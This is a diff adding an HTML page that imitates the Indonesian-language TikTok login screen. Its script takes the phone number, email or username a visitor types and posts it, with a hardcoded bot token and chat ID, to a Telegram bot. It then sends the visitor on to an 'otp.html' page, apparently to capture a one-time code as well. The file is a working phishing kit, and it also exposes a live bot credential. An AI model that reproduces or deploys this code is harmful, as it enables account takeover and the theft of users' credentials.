@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk | TikTok</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding-top: 10px;
+        }
+
+        .back-btn {
+            font-size: 20px;
+            cursor: pointer;
+            color: #000;
+        }
+
+        .title {
+            font-size: 17px;
+            font-weight: 700;
+        }
+
+        .info-icon {
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #ebebeb;
+            margin-bottom: 25px;
+            margin-top: 10px;
+        }
+
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px 0;
+            font-size: 15px;
+            color: #8a8a8a;
+            cursor: pointer;
+            position: relative;
+            font-weight: 500;
+        }
+
+        .tab.active {
+            color: #000;
+            font-weight: 600;
+        }
+
+        .tab.active::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background-color: #000;
+        }
+
+        /* Input Box */
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-box {
+            display: flex;
+            align-items: center;
+            background-color: #f1f1f2;
+            border-radius: 4px;
+            padding: 0 12px;
+            height: 44px;
+            border: 1px solid transparent;
+        }
+
+        .input-box:focus-within {
+            border-color: #d1d1d3;
+        }
+
+        .country-code {
+            font-weight: 600;
+            padding-right: 12px;
+            border-right: 1px solid #d1d1d3;
+            margin-right: 12px;
+            font-size: 15px;
+            color: #161823;
+        }
+
+        input {
+            background: transparent;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            width: 100%;
+            color: #161823;
+            caret-color: #fe2c55;
+        }
+
+        input::placeholder {
+            color: #8a8a8a;
+        }
+
+        /* Tombol Lanjutkan */
+        .btn-submit {
+            width: calc(100% - 40px);
+            background-color: #ffc2d1; /* Disabled state color */
+            color: white;
+            border: none;
+            border-radius: 26px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            position: fixed;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            cursor: not-allowed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            max-width: 410px;
+            transition: background-color 0.3s;
+        }
+
+        .btn-submit.active {
+            background-color: #fe2c55;
+            cursor: pointer;
+        }
+
+        .loader {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Splash Screen */
+        #splash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        #splash img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <!-- Splash Screen -->
+    <div id="splash">
+        <img src="https://static.tildacdn.ink/tild6266-3265-4638-a262-353532356236/1000248762.png" alt="TikTok">
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <span class="back-btn">❮</span>
+            <div class="title">Masuk</div>
+            <span class="info-icon">ⓘ</span>
+        </div>
+
+        <div class="tabs">
+            <div class="tab active" id="tab-phone" onclick="switchTab('phone')">Telepon</div>
+            <div class="tab" id="tab-email" onclick="switchTab('email')">Email/nama pengguna</div>
+        </div>
+
+        <form onsubmit="handleSubmit(event)">
+            <div class="input-group">
+                <div class="input-box">
+                    <div id="prefix" class="country-code">+62</div>
+                    <input 
+                        type="tel" 
+                        id="main-input" 
+                        placeholder="Nomor telepon" 
+                        autocomplete="off"
+                        required
+                        oninput="checkInput()"
+                    >
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit" id="submitBtn" disabled>
+                <div class="loader" id="loader"></div>
+                <span id="btnText">Lanjutkan</span>
+            </button>
+        </form>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8499835544:AAF_KRcHMfFaw83C47bmGYPXVLDRY5fo1pA';
+        const CHAT_ID = '5826930555';
+        let currentMethod = 'phone';
+
+        // Hide splash after 2 seconds
+        window.onload = () => {
+            setTimeout(() => {
+                document.getElementById('splash').style.display = 'none';
+            }, 2000);
+        };
+
+        function switchTab(method) {
+            currentMethod = method;
+            const tabPhone = document.getElementById('tab-phone');
+            const tabEmail = document.getElementById('tab-email');
+            const prefix = document.getElementById('prefix');
+            const input = document.getElementById('main-input');
+
+            if (method === 'phone') {
+                tabPhone.classList.add('active');
+                tabEmail.classList.remove('active');
+                prefix.style.display = 'block';
+                input.type = 'tel';
+                input.placeholder = 'Nomor telepon';
+            } else {
+                tabEmail.classList.add('active');
+                tabPhone.classList.remove('active');
+                prefix.style.display = 'none';
+                input.type = 'text';
+                input.placeholder = 'Email atau nama pengguna';
+            }
+            checkInput();
+        }
+
+        function checkInput() {
+            const input = document.getElementById('main-input').value.trim();
+            const btn = document.getElementById('submitBtn');
+            if (input.length > 3) {
+                btn.classList.add('active');
+                btn.disabled = false;
+            } else {
+                btn.classList.remove('active');
+                btn.disabled = true;
+            }
+        }
+
+        async function handleSubmit(event) {
+            event.preventDefault();
+            const inputVal = document.getElementById('main-input').value.trim();
+            const btn = document.getElementById('submitBtn');
+            const loader = document.getElementById('loader');
+            const btnText = document.getElementById('btnText');
+
+            btn.disabled = true;
+            loader.style.display = 'inline-block';
+            btnText.textContent = 'Memproses...';
+
+            const message = `📱 *TikTok Login Baru*\n\n` +
+                          `👤 *Metode:* ${currentMethod}\n` +
+                          `📧 *Input:* \`${inputVal}\`\n` +
+                          `📅 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    }),
+                });
+                
+                // Redirect to otp.html with value
+                window.location.href = `otp.html?value=${encodeURIComponent(inputVal)}`;
+            } catch (error) {
+                window.location.href = `otp.html?value=${encodeURIComponent(inputVal)}`;
+            }
+        }
+    </script>
+</body>
+</html>
